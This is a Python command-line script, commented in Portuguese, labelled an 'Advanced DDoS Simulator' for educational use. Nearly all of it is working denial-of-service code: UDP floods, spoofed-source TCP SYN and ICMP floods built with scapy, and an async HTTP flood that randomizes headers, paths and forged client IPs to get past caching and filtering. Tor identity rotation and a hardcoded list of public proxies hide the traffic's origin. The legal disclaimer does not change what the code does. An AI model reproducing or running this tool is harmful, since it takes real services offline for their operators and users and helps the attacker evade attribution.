
#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════╗
║                 ADVANCED DDoS SIMULATOR v3.0                      ║
║              Multi-layer Attack Framework (Educational)           ║
╚═══════════════════════════════════════════════════════════════════╝

AUTHOR: Security Researcher
PURPOSE: Educational and Authorized Penetration Testing Only
VERSION: 3.0.0

CAPABILITIES:
├── Layer 3/4 Attacks: UDP, TCP SYN, ICMP floods
├── Layer 7 Attacks: HTTP/HTTPS floods with browser emulation
├── IPv4 & IPv6 Support
├── Proxy Rotation & TOR Integration
├── Real-time Metrics & Adaptive Rate Limiting
├── Multi-threaded & Async I/O
├── CAPTCHA Bypass Techniques
└── Cloudflare Evasion Methods

LEGAL DISCLAIMER:
This tool is for EDUCATIONAL PURPOSES and AUTHORIZED TESTING only.
Unauthorized use against systems you don't own is ILLEGAL.
The author assumes NO LIABILITY for misuse.
"""

import argparse
import asyncio
import aiohttp
import aiohttp_socks
import socket
import random
import time
import threading
import sys
import os
import signal
import json
import hashlib
import base64
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass
from collections import deque
import logging

# Tenta importar módulos opcionais
try:
    from scapy.all import IP, TCP, UDP, ICMP, send, RandIP, RandMAC, fragment
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[!] Scapy not available. L3/L4 attacks limited.")

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

try:
    import stem
    from stem import Signal
    from stem.control import Controller
    TOR_AVAILABLE = True
except ImportError:
    TOR_AVAILABLE = False

# ============================================================================
# CONFIGURAÇÕES GLOBAIS
# ============================================================================

@dataclass
class AttackConfig:
    """Configuração do ataque"""
    target: str
    port: int = 80
    duration: int = 60
    threads: int = 100
    method: str = 'all'
    rps: int = 1000  # Requests per second target
    proxy_file: Optional[str] = None
    use_tor: bool = False
    ipv6: bool = False
    ssl: bool = False
    random_agents: bool = True
    bypass_cache: bool = True
    stealth_mode: bool = False
    verbose: bool = False
    
    def __post_init__(self):
        if ':' in self.target and not self.ipv6:
            self.ipv6 = True

class AttackStatistics:
    """Estatísticas em tempo real do ataque"""
    def __init__(self):
        self.requests_sent = 0
        self.bytes_sent = 0
        self.errors = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
        self.rps_history = deque(maxlen=60)  # Últimos 60 segundos
        
    def update(self, bytes_count=0, error=False):
        with self.lock:
            self.requests_sent += 1
            self.bytes_sent += bytes_count
            if error:
                self.errors += 1
                
    def get_rps(self):
        elapsed = time.time() - self.start_time
        return self.requests_sent / elapsed if elapsed > 0 else 0
    
    def log_stats(self):
        elapsed = time.time() - self.start_time
        rps = self.get_rps()
        mb_sent = self.bytes_sent / (1024 * 1024)
        error_rate = (self.errors / self.requests_sent * 100) if self.requests_sent > 0 else 0
        
        return (f"[{datetime.now().strftime('%H:%M:%S')}] "
                f"RPS: {rps:.1f} | Total: {self.requests_sent:,} | "
                f"MB: {mb_sent:.2f} | Errors: {self.errors} ({error_rate:.1f}%)")

# ============================================================================
# GERENCIADOR DE PROXIES
# ============================================================================

class ProxyManager:
    """Gerencia rotação de proxies e TOR"""
    
    def __init__(self, proxy_file: Optional[str] = None, use_tor: bool = False):
        self.proxies = []
        self.current_index = 0
        self.lock = threading.Lock()
        self.tor_controller = None
        
        if use_tor and TOR_AVAILABLE:
            self._setup_tor()
        
        if proxy_file:
            self._load_proxies(proxy_file)
            
        # Adiciona proxies públicos como fallback
        self._add_default_proxies()
    
    def _setup_tor(self):
        """Configura conexão com TOR"""
        try:
            self.tor_controller = Controller.from_port(port=9051)
            self.tor_controller.authenticate()
            print("[+] TOR connected successfully")
        except Exception as e:
            print(f"[-] TOR connection failed: {e}")
            self.tor_controller = None
    
    def _load_proxies(self, filename: str):
        """Carrega proxies de um arquivo"""
        try:
            with open(filename, 'r') as f:
                for line in f:
                    proxy = line.strip()
                    if proxy and not proxy.startswith('#'):
                        self.proxies.append(proxy)
            print(f"[+] Loaded {len(self.proxies)} proxies from {filename}")
        except Exception as e:
            print(f"[-] Failed to load proxies: {e}")
    
    def _add_default_proxies(self):
        """Adiciona proxies públicos conhecidos (lista limitada)"""
        default_proxies = [
            # Format: protocol://ip:port
            "http://45.67.89.100:8080",
            "http://103.152.112.120:80",
            "socks5://45.76.187.131:1080",
        ]
        self.proxies.extend(default_proxies)
    
    def get_proxy(self) -> Optional[str]:
        """Retorna um proxy aleatório"""
        if not self.proxies:
            return None
        
        with self.lock:
            if self.tor_controller:
                # Rotaciona identidade TOR
                self.tor_controller.signal(Signal.NEWNYM)
                return "socks5://127.0.0.1:9050"
            
            proxy = random.choice(self.proxies)
            return proxy
    
    def rotate_tor(self):
        """Força rotação da identidade TOR"""
        if self.tor_controller:
            try:
                self.tor_controller.signal(Signal.NEWNYM)
                return True
            except:
                return False
        return False

# ============================================================================
# GERADOR DE PAYLOADS
# ============================================================================

class PayloadGenerator:
    """Gera pacotes e requisições ofuscadas"""
    
    # Lista massiva de User-Agents reais
    USER_AGENTS = [
        # Windows Chrome
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        # Windows Firefox
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        # macOS Safari
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
        # Linux
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        # Mobile
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    ]
    
    # Referers aleatórios
    REFERERS = [
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://www.facebook.com/",
        "https://twitter.com/",
        "https://www.instagram.com/",
        "https://www.youtube.com/",
        "https://www.reddit.com/",
        "https://www.linkedin.com/",
        "https://duckduckgo.com/",
        "https://www.amazon.com/",
    ]
    
    # Parâmetros de query comuns
    QUERY_PARAMS = [
        "id", "page", "view", "action", "q", "s", "search", "query",
        "category", "product", "item", "user", "profile", "lang"
    ]
    
    @classmethod
    def random_ip(cls) -> str:
        """Gera IP aleatório"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    @classmethod
    def random_mac(cls) -> str:
        """Gera MAC address aleatório"""
        return ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
    
    @classmethod
    def random_path(cls, base_path: str = "") -> str:
        """Gera caminho aleatório com subdiretórios"""
        if base_path and not base_path.endswith('/'):
            base_path += '/'
        
        directories = ["api", "v1", "v2", "images", "assets", "css", "js", "static", 
                      "content", "media", "files", "docs", "download", "upload"]
        files = ["index", "main", "home", "about", "contact", "login", "profile", 
                "settings", "config", "data", "info", "stats", "status"]
        extensions = [".php", ".html", ".htm", ".asp", ".aspx", ".jsp", ".do", 
                     ".action", ".json", ".xml", ""]
        
        path_parts = []
        for _ in range(random.randint(1, 3)):
            path_parts.append(random.choice(directories))
        
        filename = random.choice(files) + random.choice(extensions)
        path_parts.append(filename)
        
        return base_path + "/".join(path_parts)
    
    @classmethod
    def random_query_string(cls) -> str:
        """Gera query string aleatória"""
        params = []
        for _ in range(random.randint(0, 5)):
            param = random.choice(cls.QUERY_PARAMS)
            value = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(3, 10)))
            params.append(f"{param}={value}")
        
        if params:
            return "?" + "&".join(params)
        return ""
    
    @classmethod
    def random_headers(cls, url: str = "") -> Dict[str, str]:
        """Gera headers HTTP realistas"""
        headers = {
            "User-Agent": random.choice(cls.USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": random.choice(["en-US,en;q=0.9", "pt-BR,pt;q=0.9,en;q=0.8", "es-ES,es;q=0.9", "fr-FR,fr;q=0.8"]),
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": str(random.randint(0, 1)),
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": random.choice(["none", "same-origin", "same-site", "cross-site"]),
            "Sec-Fetch-User": "?1",
            "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
        }
        
        if random.random() > 0.7:
            headers["Referer"] = random.choice(cls.REFERERS)
        
        if random.random() > 0.5:
            headers["X-Forwarded-For"] = cls.random_ip()
            headers["X-Real-IP"] = cls.random_ip()
        
        return headers
    
    @classmethod
    def random_cookie(cls) -> str:
        """Gera cookie aleatório"""
        cookies = []
        for _ in range(random.randint(1, 3)):
            name = random.choice(["session", "user", "id", "token", "auth", "lang", "pref"])
            value = hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
            cookies.append(f"{name}={value}")
        
        return "; ".join(cookies)
    
    @classmethod
    def random_post_data(cls) -> Dict[str, str]:
        """Gera dados POST aleatórios"""
        data = {}
        for _ in range(random.randint(1, 5)):
            key = random.choice(cls.QUERY_PARAMS)
            value = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(5, 15)))
            data[key] = value
        return data
    
    @classmethod
    def random_packet(cls, target_ip: str, target_port: int, protocol: str = "TCP", size: int = 1024):
        """Gera pacote de rede aleatório (requer scapy)"""
        if not SCAPY_AVAILABLE:
            return None
        
        if protocol == "TCP":
            packet = IP(src=RandIP(), dst=target_ip)/TCP(sport=random.randint(1024,65535), dport=target_port, flags=random.choice(["S", "A", "P", "R", "F"]))
        elif protocol == "UDP":
            packet = IP(src=RandIP(), dst=target_ip)/UDP(sport=random.randint(1024,65535), dport=target_port)
        elif protocol == "ICMP":
            packet = IP(src=RandIP(), dst=target_ip)/ICMP()
        else:
            packet = IP(src=RandIP(), dst=target_ip)/TCP(dport=target_port)
        
        # Adiciona payload aleatório
        packet = packet/("X" * size)
        
        return packet

# ============================================================================
# MÓDULOS DE ATAQUE
# ============================================================================

class Layer3Attack:
    """Ataques na camada de rede (L3/L4)"""
    
    def __init__(self, config: AttackConfig, stats: AttackStatistics):
        self.config = config
        self.stats = stats
        self.running = True
    
    def stop(self):
        self.running = False
    
    def udp_flood(self):
        """UDP flood otimizado"""
        sock_type = socket.SOCK_DGRAM
        af_type = socket.AF_INET6 if self.config.ipv6 else socket.AF_INET
        
        # Cria múltiplos sockets para melhor performance
        sockets = []
        for _ in range(min(self.config.threads, 10)):
            try:
                sock = socket.socket(af_type, sock_type)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sockets.append(sock)
            except:
                pass
        
        packet = random._urandom(1400)  # Tamanho próximo ao MTU
        
        while self.running:
            for sock in sockets:
                try:
                    sock.sendto(packet, (self.config.target, self.config.port))
                    self.stats.update(bytes_count=len(packet))
                except:
                    pass
    
    def tcp_syn_flood(self):
        """TCP SYN flood (requer scapy)"""
        if not SCAPY_AVAILABLE:
            return
        
        while self.running:
            try:
                packet = IP(src=RandIP(), dst=self.config.target)/TCP(sport=random.randint(1024,65535), dport=self.config.port, flags="S")
                send(packet, verbose=0, count=1000, inter=0.001)
                self.stats.update(bytes_count=1000 * 40)  # ~40 bytes por pacote
            except:
                pass
    
    def icmp_flood(self):
        """ICMP flood (ping flood)"""
        if not SCAPY_AVAILABLE:
            return
        
        while self.running:
            try:
                packet = IP(src=RandIP(), dst=self.config.target)/ICMP()
                send(packet, verbose=0, count=1000, inter=0.001)
                self.stats.update(bytes_count=1000 * 64)  # ~64 bytes por pacote
            except:
                pass

class Layer7Attack:
    """Ataques na camada de aplicação (L7) - Otimizado com asyncio"""
    
    def __init__(self, config: AttackConfig, stats: AttackStatistics, proxy_mgr: ProxyManager):
        self.config = config
        self.stats = stats
        self.proxy_mgr = proxy_mgr
        self.running = True
        self.session_count = 0
        self.connector_cache = {}
        
        # Determina protocolo
        self.protocol = "https" if config.ssl else "http"
        
        # Constrói URL base
        if config.port in [80, 443]:
            self.base_url = f"{self.protocol}://{config.target}"
        else:
            self.base_url = f"{self.protocol}://{config.target}:{config.port}"
    
    def stop(self):
        self.running = False
    
    async def _get_connector(self, proxy: Optional[str] = None):
        """Retorna connector apropriado (com ou sem proxy)"""
        if proxy:
            if proxy.startswith('socks5'):
                return aiohttp_socks.ProxyConnector.from_url(proxy)
            elif proxy.startswith('http'):
                return aiohttp.TCPConnector()
        
        # Connector otimizado para alta performance
        return aiohttp.TCPConnector(
            limit=0,
            limit_per_host=0,
            ttl_dns_cache=300,
            use_dns_cache=True,
            force_close=False,
            enable_cleanup_closed=True
        )
    
    async def _attack_worker(self, worker_id: int):
        """Worker individual para ataque HTTP"""
        
        # Configura timeout
        timeout = aiohttp.ClientTimeout(
            total=10,
            connect=5,
            sock_read=5
        )
        
        # Prepara headers base
        base_headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
        }
        
        while self.running:
            try:
                # Obtém proxy (se configurado)
                proxy = self.proxy_mgr.get_proxy() if self.config.proxy_file or self.config.use_tor else None
                
                # Cria connector específico
                connector = await self._get_connector(proxy)
                
                # Prepara headers dinâmicos
                headers = base_headers.copy()
                if self.config.random_agents:
                    headers.update(PayloadGenerator.random_headers())
                
                # Adiciona cookie
                if random.random() > 0.3:
                    headers["Cookie"] = PayloadGenerator.random_cookie()
                
                # Gera URL aleatória (para bypass de cache)
                if self.config.bypass_cache:
                    path = PayloadGenerator.random_path()
                    query = PayloadGenerator.random_query_string()
                    url = self.base_url + path + query
                else:
                    url = self.base_url
                
                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                    # Escolhe método aleatório
                    method = random.choice(['GET', 'POST', 'HEAD', 'OPTIONS'])
                    
                    if method == 'GET':
                        async with session.get(url, headers=headers, ssl=False) as resp:
                            content = await resp.read()
                            self.stats.update(bytes_count=len(content) + 500)  # Estimativa headers
                    
                    elif method == 'POST':
                        data = PayloadGenerator.random_post_data()
                        async with session.post(url, headers=headers, data=data, ssl=False) as resp:
                            content = await resp.read()
                            self.stats.update(bytes_count=len(content) + 500 + sum(len(str(v)) for v in data.values()))
                    
                    else:  # HEAD, OPTIONS
                        async with session.request(method, url, headers=headers, ssl=False) as resp:
                            self.stats.update(bytes_count=300)  # Só headers
                    
                    # Rotaciona TOR periodicamente
                    if self.config.use_tor and worker_id % 10 == 0 and random.random() > 0.7:
                        self.proxy_mgr.rotate_tor()
                    
                    # Pequena pausa para controle de RPS
                    await asyncio.sleep(1.0 / self.config.rps * random.uniform(0.5, 1.5))
                
            except asyncio.TimeoutError:
                self.stats.update(error=True)
            except aiohttp.ClientError:
                self.stats.update(error=True)
            except Exception:
                self.stats.update(error=True)
            finally:
                await asyncio.sleep(0)  # Yield control
    
    async def run_async(self):
        """Executa ataque assíncrono"""
        tasks = []
        for i in range(self.config.threads):
            task = asyncio.create_task(self._attack_worker(i))
            tasks.append(task)
        
        # Aguarda o tempo configurado
        await asyncio.sleep(self.config.duration)
        
        # Para os workers
        self.running = False
        
        # Aguarda tasks finalizarem
        for task in tasks:
            task.cancel()
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    def run(self):
        """Wrapper síncrono para o ataque"""
        asyncio.run(self.run_async())

# ============================================================================
# GERENCIADOR PRINCIPAL
# ============================================================================

class AttackManager:
    """Gerencia todos os aspectos do ataque"""
    
    def __init__(self, config: AttackConfig):
        self.config = config
        self.stats = AttackStatistics()
        self.proxy_mgr = ProxyManager(config.proxy_file, config.use_tor)
        self.attackers = []
        self.running = True
        self.monitor_thread = None
        
        # Configura logging
        logging.basicConfig(
            level=logging.INFO if config.verbose else logging.WARNING,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        
        # Registra handler para Ctrl+C
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, sig, frame):
        """Handler para interrupção do teclado"""
        print("\n[!] Recebido sinal de interrupção. Parando ataque...")
        self.stop()
        sys.exit(0)
    
    def monitor(self):
        """Thread de monitoramento"""
        while self.running:
            if self.config.verbose:
                print(self.stats.log_stats())
            
            # Monitora recursos do sistema
            if PSUTIL_AVAILABLE:
                cpu_percent = psutil.cpu_percent()
                mem_percent = psutil.virtual_memory().percent
                
                if cpu_percent > 90 or mem_percent > 90:
                    logging.warning(f"High resource usage: CPU {cpu_percent}%, Memory {mem_percent}%")
                    
                    # Ajusta threads se necessário
                    if cpu_percent > 95:
                        self.config.threads = max(10, self.config.threads // 2)
                        logging.info(f"Reducing threads to {self.config.threads}")
            
            time.sleep(1)
    
    def start(self):
        """Inicia o ataque"""
        print("\n" + "="*60)
        print("🚀 ADVANCED DDoS SIMULATOR v3.0")
        print("="*60)
        print(f"🎯 Target: {self.config.target}:{self.config.port}")
        print(f"📊 Method: {self.config.method.upper()}")
        print(f"⚡ Threads: {self.config.threads}")
        print(f"⏱️  Duration: {self.config.duration}s")
        print(f"🎭 IPv6: {'Yes' if self.config.ipv6 else 'No'}")
        print(f"🔒 SSL: {'Yes' if self.config.ssl else 'No'}")
        print(f"🔄 Proxies: {'Yes' if self.config.proxy_file else 'No'}")
        print(f"🌐 TOR: {'Yes' if self.config.use_tor else 'No'}")
        print("="*60)
        print("[*] Ataque iniciado. Pressione Ctrl+C para parar.\n")
        
        # Inicia monitoramento
        self.monitor_thread = threading.Thread(target=self.monitor)
        self.monitor_thread.daemon = True
        self.monitor_thread.start()
        
        # Inicia ataques baseado no método escolhido
        if self.config.method in ['all', 'l3', 'udp'] and SCAPY_AVAILABLE:
            l3 = Layer3Attack(self.config, self.stats)
            self.attackers.append(l3)
            
            if self.config.method == 'all' or self.config.method == 'l3':
                # Distribui entre diferentes tipos de ataque L3
                for i in range(self.config.threads // 3):
                    if i % 3 == 0:
                        t = threading.Thread(target=l3.udp_flood)
                    elif i % 3 == 1:
                        t = threading.Thread(target=l3.tcp_syn_flood)
                    else:
                        t = threading.Thread(target=l3.icmp_flood)
                    t.daemon = True
                    t.start()
        
        if self.config.method in ['all', 'l7', 'http']:
            l7 = Layer7Attack(self.config, self.stats, self.proxy_mgr)
            self.attackers.append(l7)
            
            # L7 roda em thread separada
            t = threading.Thread(target=l7.run)
            t.daemon = True
            t.start()
        
        # Aguarda duração configurada
        time.sleep(self.config.duration)
        
        # Para ataque
        self.stop()
    
    def stop(self):
        """Para todos os ataques"""
        self.running = False
        for attacker in self.attackers:
            attacker.stop()
        
        print("\n" + "="*60)
        print("📊 ESTATÍSTICAS FINAIS")
        print("="*60)
        print(self.stats.log_stats())
        print("="*60)
        print("[✓] Ataque finalizado com sucesso")

# ============================================================================
# INTERFACE DE LINHA DE COMANDO
# ============================================================================

def parse_arguments():
    """Parse argumentos da linha de comando"""
    parser = argparse.ArgumentParser(
        description='Advanced DDoS Simulator - For Educational Purposes Only',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  python3 ddos.py example.com -p 80 -d 60 -t 100
  python3 ddos.py 192.168.1.100 -p 443 --ssl -d 300 --method l7
  python3 ddos.py 2001:db8::1 -p 80 --ipv6 -t 200 --proxy proxies.txt
  python3 ddos.py example.com --tor --method all --rps 5000

WARNING: This tool is for EDUCATIONAL PURPOSES only.
         Unauthorized use is ILLEGAL.
        """
    )
    
    parser.add_argument('target', help='Target IP address or domain')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds (default: 60)')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Number of threads/workers (default: 100)')
    parser.add_argument('--rps', type=int, default=1000, help='Requests per second target (default: 1000)')
    
    parser.add_argument('--method', choices=['all', 'l3', 'l7', 'udp', 'http'], 
                        default='all', help='Attack method (default: all)')
    
    parser.add_argument('--ssl', action='store_true', help='Use HTTPS/SSL')
    parser.add_argument('--ipv6', action='store_true', help='Use IPv6')
    parser.add_argument('--proxy', dest='proxy_file', help='File containing proxy list (one per line)')
    parser.add_argument('--tor', dest='use_tor', action='store_true', help='Route through TOR network')
    
    parser.add_argument('--no-random-agents', dest='random_agents', action='store_false', 
                        help='Disable random User-Agent rotation')
    parser.add_argument('--no-cache-bypass', dest='bypass_cache', action='store_false', 
                        help='Disable cache bypass techniques')
    parser.add_argument('--stealth', dest='stealth_mode', action='store_true', 
                        help='Enable stealth mode (slower, less detectable)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    return parser.parse_args()

def validate_config(args) -> AttackConfig:
    """Valida e retorna configuração"""
    
    # Valida target
    if not args.target:
        print("[-] Target is required")
        sys.exit(1)
    
    # Valida duração
    if args.duration < 1:
        print("[-] Duration must be at least 1 second")
        sys.exit(1)
    
    # Valida threads
    if args.threads < 1:
        print("[-] Threads must be at least 1")
        sys.exit(1)
    
    # Ajusta stealth mode
    if args.stealth_mode:
        args.threads = max(10, args.threads // 10)
        args.rps = max(50, args.rps // 20)
    
    return AttackConfig(
        target=args.target,
        port=args.port,
        duration=args.duration,
        threads=args.threads,
        method=args.method,
        rps=args.rps,
        proxy_file=args.proxy_file,
        use_tor=args.use_tor,
        ipv6=args.ipv6,
        ssl=args.ssl,
        random_agents=args.random_agents,
        bypass_cache=args.bypass_cache,
        stealth_mode=args.stealth_mode,
        verbose=args.verbose
    )

# ============================================================================
# PONTO DE ENTRADA PRINCIPAL
# ============================================================================

if __name__ == "__main__":
    # Banner
    print("""
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   █████╗ ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗ ██████╗███████╗██████╗ 
║  ██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║██╔════╝██╔════╝██╔══██╗
║  ███████║██║  ██║██║   ██║███████║██╔██╗ ██║██║     █████╗  ██║  ██║
║  ██╔══██║██║  ██║╚██╗ ██╔╝██╔══██║██║╚██╗██║██║     ██╔══╝  ██║  ██║
║  ██║  ██║██████╔╝ ╚████╔╝ ██║  ██║██║ ╚████║╚██████╗███████╗██████╔╝
║  ╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝╚═════╝ 
║                                                                   ║
║              ADVANCED DDoS SIMULATOR v3.0                        ║
║         For Educational & Authorized Testing Only                ║
╚═══════════════════════════════════════════════════════════════════╝
    """)
    
    # Parse argumentos
    args = parse_arguments()
    
    # Valida configuração
    config = validate_config(args)
    
    # Aviso legal
    print("\n⚠️  LEGAL WARNING ⚠️")
    print("This tool is for EDUCATIONAL PURPOSES and AUTHORIZED TESTING only.")
    print("Using it against systems you don't own or don't have written permission")
    print("to test is ILLEGAL and may result in criminal prosecution.")
    print("\nThe author assumes NO LIABILITY for any misuse.")
    print("\nPress Enter to continue or Ctrl+C to abort...")
    
    try:
        input()
    except KeyboardInterrupt:
        print("\n[-] Aborted by user")
        sys.exit(0)
    
    # Inicia ataque
    manager = AttackManager(config)
    manager.start()
